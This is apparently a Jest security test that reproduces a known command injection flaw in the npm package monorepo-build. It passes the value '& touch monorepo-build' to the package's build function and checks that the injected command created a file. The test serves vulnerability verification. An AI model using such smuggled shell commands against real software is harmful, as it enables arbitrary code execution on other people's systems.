//https://snyk.io/vuln/SNYK-JS-MONOREPOBUILD-1050392
test("Command Injection in monorepo-build", (done) => {
  expect.assertions(2);
  var a = require("monorepo-build");
  const fs = require("fs");
  const path = "./monorepo-build";
  const sleep = require("sleep");
  var execSync = require("child_process").execSync;
  var user_name = "";
  var user_email = "";
  try {
    const cmd = "git config user.email";
    user_email = execSync(cmd).toString().trim();
  } catch (error) {}
  try {
    const cmd = "git config user.name";
    user_name = execSync(cmd).toString().trim();
  } catch (error) {}
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.build("./", "& touch monorepo-build");
  } catch (error) {
    console.log("syntax-error");
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {
    try {
      const cmd = `git config user.name "${user_name}"`;
      execSync(cmd).toString();
    } catch (error) {
      console.log(error);
    }
    try {
      const cmd = `git config user.email "${user_email}"`;
      execSync(cmd).toString();
    } catch (error) {
      console.log(error);
    }
    done();
  });
});
